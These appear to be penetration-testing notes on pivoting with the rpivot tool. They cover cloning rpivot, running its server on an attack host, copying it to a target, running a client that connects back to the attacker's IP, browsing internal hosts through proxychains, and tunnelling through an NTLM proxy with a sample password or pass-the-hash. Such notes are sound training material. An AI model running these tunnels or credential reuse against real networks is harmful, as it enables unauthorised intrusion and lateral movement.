
![Screenshot_4](https://github.com/kiro6/penetration-testing-notes/assets/57776872/e316aa5a-2008-4b58-9809-0169954655af)


### Cloning rpivot
```shell
$ sudo git clone https://github.com/klsecservices/rpivot.git
```

### Running server.py from the Attack Host
```shell
$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

### Transfering rpivot to the Target
```shell
$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```
### Running client.py from Pivot Target
```shell
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

### Browsing to the Target Webserver using Proxychains
```
proxychains firefox-esr 172.16.5.135:80
```

### To pivot through an NTLM proxy
```shell
python2.7 client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

### Pass-the-hash is supported
```shell
python2.7 client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
